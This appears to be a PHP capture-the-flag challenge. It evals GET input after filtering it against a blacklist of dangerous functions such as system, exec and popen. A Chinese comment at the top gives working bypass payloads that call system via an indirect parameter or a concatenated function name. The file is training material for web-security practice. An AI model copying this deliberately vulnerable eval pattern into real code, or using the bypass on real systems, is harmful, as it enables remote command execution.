<!--
题目看样子是过滤了基本上所有要用的函数，但是由于php太"动态"了(题目名称)，实际上可以这么搞
cmd=$_GET[func]($_GET[shell])&func=system&shell=cat flag
当然也可以
$e='sys'.'tem';$e('cat flag');
-->
<?php
highlight_file(__FILE__);
error_reporting(0);
$blacklist = ["system", "ini_set", "exec", "scandir", "shell_exec", "proc_open", "error_log", "ini_alter", "ini_set", "pfsockopen", "readfile", "echo", "file_get_contents", "readlink", "symlink", "popen", "fopen", "file", "fpassthru"];
$blacklist = array_merge($blacklist, get_defined_functions()['internal']);
foreach($blacklist as $i){
    if(stristr($_GET[cmd], $i)!==false){
        die('hack');
    }
}
eval($_GET[cmd]);
